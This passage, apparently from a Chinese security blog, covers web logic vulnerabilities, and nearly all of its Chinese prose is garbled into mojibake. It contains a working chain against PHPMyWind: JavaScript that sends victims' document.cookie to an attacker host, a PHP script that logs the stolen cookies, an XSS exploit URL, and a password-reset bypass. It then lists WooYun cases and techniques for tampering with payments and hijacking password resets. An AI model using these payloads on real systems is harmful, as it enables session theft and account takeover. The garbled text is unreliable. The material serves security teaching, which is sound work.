<td>å¯é€šè¿‡æµè§ˆå™¨è®¿é—®â€œæœåŠ¡å™¨â€ä¸Šçš„â€œPHPMyWindâ€ç½‘ç«™</td>
</tr>
</tbody>
</table>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122150706.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<ol>
<li>è¿‡ç¨‹1ä»£è¡¨æ”»å‡»è€…safedogé€šè¿‡é‚®ä»¶ç­‰æ–¹å¼å‘é€æ¶æ„é“¾æ¥ï¼ˆåµŒæœ‰å¯ç›—å–å¹¶å‘é€Cookieçš„JSè„šæœ¬ï¼‰ç»™å—å®³è€…victimï¼›</li>
<li>è¿‡ç¨‹2ä»£è¡¨åœ¨å—å®³è€…victimå—è¯±å¯¼ç‚¹å‡»æ¶æ„é“¾æ¥åï¼Œä¼šç»ç”±æµè§ˆå™¨å°†æ”»å‡»è€…safedogåµŒå…¥çš„JSè„šæœ¬å½“åšæ•°æ®å‘é€ç»™æœåŠ¡å™¨ä¸Šçš„PHPMyWindç½‘ç«™çš„åå°„å‹XSSæ¼æ´ç‚¹ï¼›</li>
<li>è¿‡ç¨‹3ä¸è¿‡ç¨‹4ä»£è¡¨PHPMyWindç½‘ç«™åœ¨å—åˆ°åå°„å‹XSSæ”»å‡»åï¼Œä¼šæ‰§è¡ŒJSè„šæœ¬ï¼Œå°†å—å®³è€…victimçš„Cookieè¿”å›ç»™å—å®³è€…victimï¼Œå¹¶å‘é€ç»™æ”»å‡»è€…safedogã€‚</li>
<li>è¿‡ç¨‹5ä»£è¡¨æ”»å‡»è€…safedogåœ¨è·å¾—å—å®³è€…victimçš„Cookieåï¼Œåˆ©ç”¨å—å®³è€…victimçš„Cookieä¸PHPMyWindç½‘ç«™çš„é€»è¾‘æ¼æ´ç‚¹è¿›è¡Œå¯†ç é‡ç½®æ”»å‡»ã€‚</li>
</ol>
<h4 id="åå°„å‹XSS">åå°„å‹XSS</h4>
<p>æ”»å‡»è€…æ­å»ºå¯æ¥æ”¶å—å®³è€…Cookieçš„PHPç½‘ç«™ï¼›</p>
<p>è¯¥PHPç½‘ç«™ç”±â€œReflectiveXSS.jsâ€â€œReflectiveXSS.phpâ€å’Œâ€œcookie.txtâ€è¿™3ä¸ªæ–‡ä»¶æ„æˆã€‚</p>
<p>å…¶ä¸­â€œReflectiveXSS.jsâ€ç”¨äºé’ˆå¯¹æœåŠ¡å™¨ç«¯PHPMyWindç½‘ç«™çš„åå°„å‹XSSæ¼æ´çªƒå–å—å®³è€…victimçš„Cookieï¼Œå¹¶å°†è¯¥Cookieå€¼ä¼ è¾“ç»™ReflectiveXSS.phpï¼›â€œReflectiveXSS.phpâ€ç”¨äºæ¥æ”¶åä¸ºâ€œvictimcookieâ€çš„GETè¯·æ±‚ï¼Œå¹¶å°†â€œvictimcookieâ€çš„å‚æ•°å€¼ä¿å­˜åˆ°â€œcookie.txtâ€ã€‚</p>
<p>ReflectiveXSS.jsçš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡æŒ‡å®šçš„åç§°&#x27;img&#x27;åˆ›å»ºimgå…ƒç´ </span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†imgå…ƒç´ çš„srcå±æ€§æŒ‡å‘è„šæœ¬æ–‡ä»¶ReflectiveXSS.php</span></span><br><span class="line"><span class="comment">//å°†cookieä¿¡æ¯çš„å­—ç¬¦ä¸²ä½œä¸ºURIç»„ä»¶è¿›è¡Œç¼–ç ï¼Œç„¶åç”¨victimcookieå‚æ•°ä¼ é€’</span></span><br><span class="line">img.src = <span class="string">&#x27;http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>
<p>ReflectiveXSS.phpçš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;victimcookie&#x27;</span>];</span><br><span class="line">    $filePath = <span class="string">&quot;cookie.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_writable($filePath)==<span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;can&#x27;t write&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $handler = fopen($filePath, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">          fwrite($handler, $str);</span><br><span class="line">          fclose($handler);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å‡ºå‘XSSæ¼æ´çš„EXPï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.114.159&#x2F;phpmywind5-5&#x2F;data&#x2F;api&#x2F;oauth&#x2F;connect.php?method&#x3D;unknownmethod&lt;script src&#x3D;http:&#x2F;&#x2F;192.168.114.1&#x2F;safedog-attack&#x2F;ReflectiveXSS.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>å‡ºç°XSSæ¼æ´çš„åœ°æ–¹ï¼š</p>
<p>è¯¥æ¼æ´å‡ºç°çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š/data/api/oauth/connect.phpï¼Œå…¶ä¸­çš„ä»£ç æ®µï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists($connect, $method))</span><br><span class="line">    $connect-&gt;method();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¯·æ±‚çš„æ–¹æ³•[&quot;</span> . $method . <span class="string">&quot;ä¸å­˜åœ¨&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>ifåˆ¤æ–­çš„ä½œç”¨æ˜¯â€œåˆ¤æ–­å‡½æ•°åæ˜¯å¦å­˜åœ¨â€ï¼Œä»£ç çš„é€»è¾‘æ˜¯â€œå¦‚æœå‡½æ•°åä¸å­˜åœ¨ï¼Œåˆ™åœ¨PHPé¡µé¢è¾“å‡ºå‡½æ•°åâ€ï¼Œè¿™ä¸€åšæ³•ä¼šé€ æˆåå°„å‹XSSæ¼æ´ã€‚</p>
<h4 id="ä»»æ„å¯†ç é‡ç½®-v2">ä»»æ„å¯†ç é‡ç½®</h4>
<p>è¯¥æ¼æ´å‡ºç°çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š/member.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æµ‹æ—§å¯†ç æ˜¯å¦æ­£ç¡®</span></span><br><span class="line"><span class="keyword">if</span>($password != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $oldpassword = md5(md5($oldpassword));</span><br><span class="line">    $r = $dosql-&gt;GetOne(<span class="string">&quot;SELECT `password` FROM `#@__member` WHERE `username`=&#x27;<span class="subst">$c_uname</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">&#x27;password&#x27;</span>] != $oldpassword)</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(msg: <span class="string">&#x27;æŠ±æ­‰ï¼Œæ—§å¯†ç é”™è¯¯ï¼&#x27;</span>, gourl: <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;UPDATE `#@__member` SET&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($password != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $password = md5(md5($password));</span><br><span class="line">    $sql .= <span class="string">&quot;password=&#x27;<span class="subst">$password</span>&#x27;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@$sql .= <span class="string">&quot;question=&#x27;<span class="subst">$question</span>&#x27;, answer=&#x27;<span class="subst">$answer</span>&#x27;, cnname=&#x27;<span class="subst">$cnname</span>&#x27;, enname=&#x27;<span class="subst">$enname</span>&#x27;, sex=&#x27;<span class="subst">$sex</span>&#x27;, birthtype=&#x27;<span class="subst">$birthtype</span>&#x27;, birth_year=&#x27;<span class="subst">$birth_year</span>&#x27;, birth_month=&#x27;<span class="subst">$birth_month</span>&#x27;, birth_day=&#x27;<span class="subst">$birth_day</span>&#x27;, astro=&#x27;<span class="subst">$astro</span>&#x27;, bloodtype=&#x27;<span class="subst">$bloodtype</span>&#x27;, trade=&#x27;<span class="subst">$trade</span>&#x27;, live_prov=&#x27;<span class="subst">$live_prov</span>&#x27;, live_city=&#x27;<span class="subst">$live_city</span>&#x27;, live_country=&#x27;<span class="subst">$live_country</span>&#x27;, home_prov=&#x27;<span class="subst">$home_prov</span>&#x27;, home_city=&#x27;<span class="subst">$home_city</span>&#x27;, home_country=&#x27;<span class="subst">$home_country</span>&#x27;, cardtype=&#x27;<span class="subst">$cardtype</span>&#x27;, cardnum=&#x27;<span class="subst">$cardnum</span>&#x27;, intro=&#x27;<span class="subst">$intro</span>&#x27;, email=&#x27;<span class="subst">$email</span>&#x27;, qqnum=&#x27;<span class="subst">$qqnum</span>&#x27;, mobile=&#x27;<span class="subst">$mobile</span>&#x27;, telephone=&#x27;<span class="subst">$telephone</span>&#x27;, address_prov=&#x27;<span class="subst">$address_prov</span>&#x27;, address_city=&#x27;<span class="subst">$address_city</span>&#x27;, address_country=&#x27;<span class="subst">$address_country</span>&#x27;, address=&#x27;<span class="subst">$address</span>&#x27;, zipcode=&#x27;<span class="subst">$zipcode</span>&#x27; WHERE id=&#x27;<span class="subst">$id</span>&#x27; AND `username`=&#x27;<span class="subst">$c_uname</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($dosql-&gt;ExecNoneQuery($sql))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(msg: <span class="string">&#x27;èµ„æ–™æ›´æ–°æˆåŠŸ&#x27;</span>, gourl: <span class="string">&#x27;?c=edit&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­çš„ä½œç”¨æ˜¯â€œåˆ¤æ–­ç”¨æˆ·æäº¤çš„æ–°å¯†ç æ˜¯å¦ä¸ºç©ºâ€ï¼Œåœ¨ç”¨æˆ·æäº¤çš„æ–°å¯†ç ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šè¿›è¡Œâ€˜æ—§å¯†ç çš„æ¯”å¯¹â€™ï¼Œå¦‚æœæäº¤çš„æ—§å¯†ç å’Œæ•°æ®åº“çš„æŸ¥è¯¢ç»“æœä¸ä¸€è‡´ï¼Œåˆ™ä¸å…è®¸ç»§ç»­è¿›è¡Œæ›´æ¢å¯†ç çš„æ“ä½œã€‚ç¬¬äºŒä¸ªifåˆ¤æ–­çš„ä½œç”¨ä»ä¸ºâ€œåˆ¤æ–­ç”¨æˆ·æäº¤çš„æ–°å¯†ç æ˜¯å¦ä¸ºç©ºâ€ï¼Œåœ¨ç”¨æˆ·æäº¤çš„æ–°å¯†ç ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå¯¹æ–°å¯†ç è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œéšåè¿›è¡ŒSQLè¯­å¥çš„æ‹¼æ¥ã€‚è¿™ä¸¤ä¸ªifè¯­å¥å­˜åœ¨äº†é€»è¾‘æ¼æ´ã€‚å› ä¸ºï¼Œå¦‚æœæˆ‘ä»¬æäº¤çš„æ–°å¯†ç ï¼ˆpasswordå˜é‡å’Œrepasswordå˜é‡ï¼‰ä¸ºç©ºï¼Œåˆ™å¯ä»¥ç»•è¿‡å¯¹æ—§å¯†ç ï¼ˆoldpasswordå˜é‡ï¼‰çš„éªŒè¯ã€‚</p>
<p>åœ¨è¿™é‡Œä¹‹æ‰€ä»¥è¦ä½¿ç”¨XSSè·å–cookieï¼Œæ˜¯å› ä¸ºå½“SQLè¯­å¥æ»¡è¶³æ¡ä»¶<code>id='$id' AND username ='$c_uname';</code>æ—¶ï¼Œæ‰å¯è¿›è¡Œupdateæ“ä½œã€‚å˜é‡<code>c_uname</code>å€¼ï¼ˆæ˜æ–‡ï¼‰æ¥æºäº<code>AuthCode($_COOKIE['username'])</code>ï¼Œå³å…ˆå–å¾—Cookieä¸­username(å¯†æ–‡)çš„å€¼ï¼Œç„¶åé€šè¿‡AuthCodeå‡½æ•°é…åˆé…ç½®æ–‡ä»¶ä¸­çš„å¯†é’¥æ¥è·å–æ˜æ–‡ã€‚</p>
<p>PHPMyWindé‡‡ç”¨Cookieä¿å­˜æ··æ·†åŒ–çš„ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€‚å› ä¸ºé…ç½®æ–‡ä»¶ä¸­çš„å¯†é’¥æ˜¯åœ¨CMSæ­å»ºæ—¶éšæœºç”Ÿæˆçš„ï¼Œç®—æ³•ä¹Ÿä¸å¯é€†ï¼Œå› æ­¤è¦åœ¨çŸ¥é“c_nameå˜é‡çš„å‰æä¸‹ï¼Œä»æ­£å‘ä¼ªé€ usernameç­‰å˜é‡ï¼Œä»¥é€šè¿‡æƒé™éªŒè¯å…·æœ‰è¾ƒå¤§éš¾åº¦ã€‚ä¸ºè·å–Cookieä¸­çš„usernameç­‰å€¼ï¼Œå¯è€ƒè™‘å€ŸåŠ©åå°„å‹XSSæ¼æ´ã€‚</p>
<h3 id="å…¶ä»–å®ä¾‹">å…¶ä»–å®ä¾‹</h3>
<p>ç°åœ¨wooyunå·²ç»æ²¡äº†ï¼Œåªèƒ½åœ¨ä¸€äº›é•œåƒç½‘ç«™çœ‹æ¼æ´åˆé›†ï¼Œä»¥<code>é€»è¾‘æ¼æ´</code>ä¸ºå…³é”®è¯æœç´¢åˆ°äº†186ä¸ªç›¸å…³æ¼æ´ï¼ŒåŸºæœ¬ä¸ŠæŠŠæ¯ä¸ªæ¼æ´éƒ½è¿‡äº†ä¸€éï¼Œä¹Ÿæ²¡åŠæ³•å¤ç°ï¼Œè®°å½•ä¸€äº›æ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„æ¡ˆä¾‹ï¼Œæƒå½“æœé›†æ€è·¯å§ã€‚</p>
<h4 id="æ”¯ä»˜ä¸šåŠ¡ç›¸å…³é€»è¾‘æ¼æ´">æ”¯ä»˜ä¸šåŠ¡ç›¸å…³é€»è¾‘æ¼æ´</h4>
<h5 id="å¸¸è§æ‰‹æ³•">å¸¸è§æ‰‹æ³•</h5>
<ul>
<li>ä¿®æ”¹é‡‘é¢ï¼›</li>
<li>ä¿®æ”¹å•†å“æ•°é‡ï¼›</li>
<li>ä¿®æ”¹ä¼˜æƒ é‡‘é¢ï¼›</li>
<li>ä¿®æ”¹æ•°é‡ã€å•ä»·ï¼Œä¼˜æƒ ä»·æ ¼å‚æ•°ä¸ºè´Ÿæ•°ã€å°æ•°ï¼Œæ— é™å¤§ï¼›</li>
<li>å•†å“ä»·æ ¼æ›´æ”¹ï¼›</li>
<li>æ”¯ä»˜keyæ³„éœ²ç­‰ã€‚</li>
</ul>
<p>å®é™…å®‰å…¨ä¸­ä¼šæœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ï¼Œåæ­£å„ç§èƒ½æ”¹çš„å‚æ•°éƒ½å»å°è¯•ã€‚ä¸ªæ•°<em>å•ä»·-ä¼˜æƒ åˆ¸ä¸ªæ•°</em>å•ä»·=æ€»é¢ï¼Œæ¯ä¸ªå€¼éƒ½å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œå°±çœ‹æœåŠ¡è‡ªèº«å¤„ç†æ˜¯å¦æœ‰é—®é¢˜äº†ã€‚</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2011-02272.html">é¡ºä¸°å®ä¸šåŠ¡é€»è¾‘æ¼æ´</a>ï¼šæ•°é‡å’Œé‡‘é¢æ²¡æœ‰åšç­¾å</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2011-02513.html">ç§»åŠ¨æ‰‹æœºæ”¯ä»˜ä¸šåŠ¡é€»è¾‘æ¼æ´</a>ï¼šçˆ†ç ´å››ä½éªŒè¯ç </p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-019761.html">æ–°ä¸œæ–¹é€»è¾‘æ”¯ä»˜æ¼æ´</a>ï¼šä¿®æ”¹è¿è´¹é‡‘é¢ä¸ºè´Ÿæ•°ï¼Œä½¿å¾—è¯¾ç¨‹é‡‘é¢+è¿è´¹å¤§äº0å³å¯</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-074483.html">ä¸­å›½é›¶é£Ÿç½‘æ”¯ä»˜é€»è¾‘æ¼æ´</a>ï¼šåŒä¸Š</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-023789.html">é˜¿é‡Œäº‘è®¡ç®—æŒ‰é‡ä»˜è´¹é€»è¾‘æ¼æ´ä¸€æšï¼ˆä½ä»·äº«å—è¶…çº§ä¸»æœºï¼‰</a>ï¼šç»è¿‡base64ç¼–ç çš„æ•°æ®å¯ä»¥è¢«ç¯¡æ”¹ï¼Œå¹¶ä¸”åç«¯ä¼šæ¥å—ç¯¡æ”¹çš„æ•°æ®</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-036787.html">ä¹è§†å•†åŸæ”¯ä»˜é€»è¾‘æ¼æ´ï¼ˆä»·æ ¼å¯æ›´æ”¹ï¼‰</a>ï¼šä»·æ ¼å‚æ•°æ˜æ–‡æ˜¾ç¤ºåœ¨urlï¼Œå¯ä»¥ç›´æ¥æ›´æ”¹</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053181.html">å†æ¬¡æŒ–æ˜ä¹è§†å•†åŸæ”¯ä»˜é€»è¾‘æ¼æ´</a>ï¼šåŒä¸Š</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-051673.html">è¯»è§ˆå¤©ä¸‹æ”¯ä»˜é€»è¾‘æ¼æ´å¯åˆ·å……å€¼é‡‘é¢</a>ï¼šæ›¿æ¢æ”¯ä»˜è®¢å•å·</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-093365.html">ç›Šç›Ÿçˆ±ç‚’è‚¡å•†åŸæ”¯ä»˜é€»è¾‘æ¼æ´</a>ï¼šä¿®æ”¹Cookieä¸­çš„å‚æ•°å€¼</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0125060.html">é¥¿äº†ä¹ˆé€»è¾‘æ¼æ´ä¹‹å…è´¹åƒå–ä¸æ˜¯æ¢¦</a>ï¼š<code>æ‰‹æœºå·+;+æ‰‹æœºå·</code>ç»•è¿‡æœåŠ¡å™¨å¯¹æ‰‹æœºå·ç çš„æ¬¡æ•°é™åˆ¶</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0135459.html">ä¸ƒå¤•å•èº«ä¸“åœºä¹‹æ€§å¤šå¤šå…è´¹åˆ·æˆäººç”¨å“(æ”¯ä»˜é€»è¾‘æ¼æ´)</a>ï¼šæ”¹è´Ÿæ•°åˆ·ä»£å¸</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0194751.html">å¤§ç–†æŸå¤„æ”¯ä»˜é€»è¾‘æ¼æ´å¯1å…ƒä¹°æ— äººæœº</a>ï¼šhttpsæ”¹ä¸ºhttpè®¿é—®ï¼Œä¿®æ”¹æ”¯ä»˜çš„å‚æ•°</p>
<h4 id="å¯†ç æ‰¾å›ç›¸å…³é€»è¾‘æ¼æ´">å¯†ç æ‰¾å›ç›¸å…³é€»è¾‘æ¼æ´</h4>
<h5 id="å¸¸è§æ‰‹æ³•-v2">å¸¸è§æ‰‹æ³•</h5>
<ul>
<li>
<p>æ‰¾å›å¯†ç çš„éªŒè¯ç ä¸ºå››ä½æ•°å­—å¯çˆ†ç ´çœŸå®éªŒè¯ç ï¼›</p>
</li>
<li>
<p>é‡‡ç”¨æœ¬åœ°éªŒè¯,å¯ä»¥å…ˆå°è¯•ä¿®æ”¹è‡ªå·±çš„å¸å·å¯†ç ï¼Œä¿å­˜æ­£ç¡®çš„è¿”å›åŒ…ï¼Œç„¶åä¿®æ”¹ä»–äººå¯†ç çš„æ—¶å€™æ›¿æ¢è¿”å›åŒ…ï¼›</p>
</li>
<li>
<p>æœ€ç»ˆä¿®æ”¹å¯†ç çš„æ•°æ®åŒ…ï¼Œä»¥å¦å¤–çš„IDä½œä¸ºèº«ä»½åˆ¤æ–­ï¼ˆä¾‹å¦‚useridï¼‰ï¼Œè€Œè¯¥IDåœ¨åˆ«å¤„å¯ä»¥è·å–åˆ°ï¼›</p>
</li>
<li>
<p>æ¥å—éªŒè¯ç çš„æ‰‹æœºå·ä¿®æ”¹ä¸ºè‡ªå·±çš„å·ç ï¼Œç„¶åè¾“å…¥è‡ªå·±çš„å·ç æ¥æ”¶åˆ°çš„éªŒè¯ç å»è¿›è¡Œå¯†ç é‡ç½®ï¼›</p>
</li>
<li>
<p>è·å–éªŒè¯ç çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸€ä¸ªèº«ä»½æ ‡è¯†ï¼ˆä¾‹å¦‚cookieå€¼ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ›¿æ¢ä»–äººè´¦å·çš„èº«ä»½è¯é‡ç½®ä»–äººçš„å¯†ç ï¼›</p>
</li>
</ul>
<p>å…·ä½“å¯ä»¥å»iæ˜¥ç§‹çœ‹carry_yourå‘è¿‡çš„ä¸€ç¯‡ä¸“é—¨é’ˆå¯¹<a href="https://www.ichunqiu.com/course/59045">å¯†ç é‡ç½®çš„è§†é¢‘</a>ã€‚</p>
<p><strong>ç”¨æˆ·å‡­è¯æš´åŠ›ç ´è§£</strong></p>
<p>å››ä½æˆ–è€…å…­ä½çš„çº¯æ•°å­—</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011833.html">WooYun: å½“å½“ç½‘ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html">WooYun: å¾®ä¿¡ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´</a></p>
<p><strong>è¿”å›å‡­è¯</strong></p>
<p>urlè¿”å›éªŒè¯ç åŠtoken</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-05630.html">WooYun: èµ°ç§€ç½‘ç§€å›¢ä»»æ„å¯†ç ä¿®æ”¹ç¼ºé™·</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-058210.html">WooYun: å¤©å¤©ç½‘ä»»æ„è´¦æˆ·å¯†ç é‡ç½®ï¼ˆäºŒï¼‰</a></p>
<p><strong>å¯†ç æ‰¾å›å‡­è¯åœ¨é¡µé¢ä¸­</strong></p>
<p>é€šè¿‡å¯†ä¿é—®é¢˜æ‰¾å›å¯†ç </p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-04728.html">WooYun: sohué‚®ç®±ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®</a></p>
<p><strong>è¿”å›çŸ­ä¿¡éªŒè¯ç </strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-085124.html">WooYun: æ–°æµªæŸç«™ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹ï¼ˆéªŒè¯ç ä¸å–å›é€»è¾‘è®¾è®¡ä¸å½“ï¼‰</a></p>
<p><strong>é‚®ç®±å¼±token</strong></p>
<p>æ—¶é—´æˆ³çš„md5</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08333.html">WooYun: å¥‡è™360ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´</a></p>
<p><strong>ç”¨æˆ·å &amp; æœåŠ¡å™¨æ—¶é—´</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-090226.html">WooYun: ä¸­å…´æŸç½‘ç«™ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´ï¼ˆç»å…¸è®¾è®¡ç¼ºé™·æ¡ˆä¾‹ï¼‰</a></p>
<p><strong>ç”¨æˆ·å‡­è¯æœ‰æ•ˆæ€§</strong></p>
<p>çŸ­ä¿¡éªŒè¯ç </p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053349.html">WooYun: OPPOæ‰‹æœºé‡ç½®ä»»æ„è´¦æˆ·å¯†ç ï¼ˆ3ï¼‰</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053079.html">WooYun: ç¬¬äºŒæ¬¡é‡ç½®OPPOæ‰‹æœºå®˜ç½‘ä»»æ„è´¦æˆ·å¯†ç ï¼ˆç§’æ”¹ï¼‰</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020032.html">WooYun: OPPOä¿®æ”¹ä»»æ„å¸å·å¯†ç </a></p>
<p><strong>é‚®ç®±token</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-012572.html">WooYun: èº«ä»½é€šä»»æ„å¯†ç ä¿®æ”¹-æ³„æ¼å¤§é‡å…¬æ°‘ä¿¡æ¯</a></p>
<p><strong>é‡ç½®å¯†ç token</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html">WooYun: é­…æ—çš„è´¦å·ç³»ç»Ÿå†…å­˜åœ¨æ¼æ´å¯å¯¼è‡´ä»»æ„è´¦æˆ·çš„å¯†ç é‡ç½®</a></p>
<p><strong>é‡æ–°ç»‘å®š</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08307.html">WooYun: ç½‘æ˜“é‚®ç®±å¯ç›´æ¥ä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç </a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115537.html">WooYun: å¦‚å®¶é…’åº—æŸä¸¥é‡é€»è¾‘æ¼æ´å¯ç™»é™†ä»»æ„è´¦å·å¯å¯¼è‡´å‡ åƒä¸‡æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆæ¶‰åŠä»»æ„ç”¨æˆ·è´¦å·ä¸ªäººåŸºæœ¬ä¿¡æ¯ã€å…¥ä½è®°å½•ç­‰ï¼‰</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115276.html">Wooyun: åä½é…’åº—å®˜ç½‘æŸä¸¥é‡é€»è¾‘æ¼æ´å¯ç™»é™†ä»»æ„è´¦å·ï¼ˆæ¶‰åŠä»»æ„ç”¨æˆ·è´¦å·ä¸ªäººåŸºæœ¬ä¿¡æ¯ã€å…¥ä½è®°å½•ç­‰ï¼‰</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-081467.html">WooYun: 12308å¯ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç </a></p>
<p><strong>é‚®ç®±ç»‘å®š</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-092319.html">WooYun: æŸå½©ç¥¨è®¾è®¡ç¼ºé™·å¯ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç </a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-086726.html">WooYun: ä¸­å›½å·¥æ§ç½‘ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´</a></p>
<p><strong>æœåŠ¡å™¨éªŒè¯</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-018263.html">WooYun: æºç¨‹æ—…è¡Œç½‘ä»»æ„è€æ¿å¯†ç ä¿®æ”¹(åº†åœ¨wooyunç¬¬100æ´)</a></p>
<p><strong>æœåŠ¡å™¨éªŒè¯å¯æ§å†…å®¹</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-080278.html">WooYun: AAæ‹¼è½¦ç½‘ä¹‹ä»»æ„å¯†ç æ‰¾å›2</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-082582.html">WooYun: å››å·æˆ‘è¦å»å“ª517æ—…è¡Œç½‘é‡ç½®ä»»æ„è´¦å·å¯†ç æ¼æ´</a></p>
<p><strong>æœåŠ¡å™¨éªŒè¯éªŒè¯é€»è¾‘ä¸ºç©º</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088927.html">WooYun: æŸæ”¿ä¼ä½¿ç”¨é‚®ä»¶ç³»ç»Ÿç–‘ä¼¼å­˜åœ¨é€šç”¨è®¾è®¡é—®é¢˜</a></p>
<p><strong>ç”¨æˆ·èº«ä»½éªŒè¯</strong></p>
